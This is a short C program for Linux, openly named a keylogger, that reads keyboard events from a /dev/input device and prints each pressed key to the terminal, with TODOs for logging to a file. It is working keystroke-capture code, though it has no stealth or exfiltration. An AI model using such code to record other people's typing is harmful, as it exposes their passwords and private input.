#include <fcntl.h>       /* Kernel level file control operations for open */
#include <linux/input.h> /* The event codes header file */
#include <stdio.h>
#include <unistd.h> /* Kernel level file control operations for read */

/* TODO:
 * Make outputfile as an option for the logging
 * Add a 2nd option for time duration (in seconds)
 */
int main(int argc, char *argv[]) {
  int fd = 0;
  if (argc < 2) {
    printf("Usage (inputfile) [outputfile]\n"
           "Inputfile is the /dev/input/ event file that is linked to your "
           "keyboard where you can see in /dev/input/by-id\n"
           "Outputfile as an option if you want to log your key inputs\n");
    return -1;
  }
  printf("Keylogger started\n");

  fd = open(argv[1], O_RDONLY, 0);
  if (fd == -1)
    return -1;

  struct input_event ie;
  while (1) {
    read(fd, &ie, sizeof(ie));
    /* Only read event keys */
    if (ie.type != EV_KEY)
      continue;
    /* Ignore all event values other than press */
    if (ie.value != 1)
      continue;

    if (ie.code >= 2 && ie.code <= 10) {
      printf("%d", ie.code - 1);
    } else if (ie.code == 11) {
      printf("0");
    } else {
      switch (ie.code) {
      case KEY_A:
        printf("a");
        break;
      case KEY_B:
        printf("b");
        break;
      case KEY_C:
        printf("c");
        break;
      case KEY_D:
        printf("d");
        break;
      case KEY_E:
        printf("e");
        break;
      case KEY_F:
        printf("f");
        break;
      case KEY_G:
        printf("g");
        break;
      case KEY_H:
        printf("h");
        break;
      case KEY_I:
        printf("i");
        break;
      case KEY_J:
        printf("j");
        break;
      case KEY_K:
        printf("k");
        break;
      case KEY_L:
        printf("l");
        break;
      case KEY_M:
        printf("m");
        break;
      case KEY_N:
        printf("n");
        break;
      case KEY_O:
        printf("o");
        break;
      case KEY_P:
        printf("p");
        break;
      case KEY_Q:
        printf("q");
        break;
      case KEY_R:
        printf("r");
        break;
      case KEY_S:
        printf("s");
        break;
      case KEY_T:
        printf("t");
        break;
      case KEY_U:
        printf("u");
        break;
      case KEY_V:
        printf("v");
        break;
      case KEY_W:
        printf("w");
        break;
      case KEY_X:
        printf("x");
        break;
      case KEY_Y:
        printf("y");
        break;
      case KEY_Z:
        printf("z");
        break;
      case KEY_SPACE:
        printf(" ");
        break;
      case KEY_ENTER:
        printf("\n");
        break;
      default:
        printf("'%d'", ie.code);
        break;
      }
    }
    fflush(stdout);
  }
}
